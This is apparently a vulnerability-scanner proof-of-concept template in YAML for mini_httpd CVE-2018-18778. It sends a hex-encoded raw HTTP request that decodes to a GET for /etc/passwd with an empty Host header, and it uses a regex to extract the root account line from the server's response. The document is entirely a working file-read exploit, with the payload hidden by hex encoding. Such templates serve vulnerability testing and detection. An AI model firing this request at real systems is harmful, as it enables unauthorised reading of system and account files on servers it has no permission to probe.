name: poc-yaml-mini_httpd-cve-2018-18778
manual: true
transport: tcp
set:
  re1: '"(?P<root>root.*?bash)"'
rules:
    r0:
        request:
            cache: true
            content: "\x47\x45\x54\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73\x74\x3a\x20\x20\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x72\x76\x3a\x37\x38\x2e\x30\x29\x20\x47\x65\x63\x6b\x6f\x2f\x32\x30\x31\x30\x30\x31\x30\x31\x20\x46\x69\x72\x65\x66\x6f\x78\x2f\x37\x38\x2e\x30\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70\x2c\x20\x64\x65\x66\x6c\x61\x74\x65\x0d\x0a\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a\x20\x63\x6c\x6f\x73\x65\x0d\x0a\x0d\x0a"
            read_timeout: 3
        expression: re1.bmatches(response.raw)
        output:
            re1_result: re1.bsubmatch(response.raw)
            version: '"/etc/passwd: " + re1_result["root"]'
expression: r0()
detail:
  fingerprint: 
    infos:
      - type: unauth
        name: mini_httpd
        version: '{{version}}'
    author: Jarcis-cy(https://github.com/jarcis-cy)
    links:
        - https://github.com/vulhub/vulhub/tree/master/mini_httpd/CVE-2018-18778